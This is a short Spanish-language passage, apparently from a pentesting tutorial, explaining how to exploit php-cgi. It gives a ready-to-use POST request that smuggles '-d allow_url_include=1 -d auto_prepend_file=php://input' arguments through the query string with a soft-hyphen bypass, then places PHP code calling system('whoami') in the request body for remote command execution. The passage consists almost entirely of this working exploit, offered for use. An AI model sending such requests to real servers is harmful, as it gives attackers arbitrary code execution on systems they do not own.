Podemos explotar facilmente esta tecnologia mendiante una peticion POST a donde se esté usando php-cgi:

```http
POST /cgi-bin/php-cgi?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input
```

Y en el body del post podemos poner el codigo php que queremos ejecutar:

```php
<?php
	system('whoami')
?>
```

